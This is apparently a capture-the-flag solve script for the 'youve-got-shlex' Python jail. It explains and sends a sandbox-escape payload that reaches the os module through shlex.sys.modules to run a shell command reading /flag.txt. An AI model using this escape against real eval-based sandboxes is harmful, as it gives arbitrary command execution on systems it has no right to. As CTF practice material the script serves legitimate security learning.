#!/usr/bin/env python3
"""
youve-got-shlex — AlpacaHack Daily 2026-07-14

jail.py: eval(code, {"shlex": shlex, "__builtins__": {}}) with code ASCII and
containing no "_" (so no dunders/underscored names). Only `shlex` is in scope.

shlex exposes `shlex.sys` (the sys module, no underscore). sys.modules is a dict
of already-imported modules; shlex itself imported `os`, so os is loaded:
    shlex.sys.modules["os"].system("cat /flag.txt")
No underscores, pure attribute/item access + call → flag to stdout.

Usage: python3 solve.py <host> <port>
"""
import socket, sys, time, re

HOST, PORT = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((HOST, PORT), timeout=20); s.settimeout(20)
time.sleep(0.3)
s.sendall(b'shlex.sys.modules["os"].system("cat /flag.txt")\n')
buf = b""
try:
    while True:
        d = s.recv(4096)
        if not d:
            break
        buf += d
except Exception:
    pass
s.close()
m = re.search(rb"Alpaca\{[^}]*\}", buf)
print(m.group(0).decode() if m else buf.decode(errors="replace"))
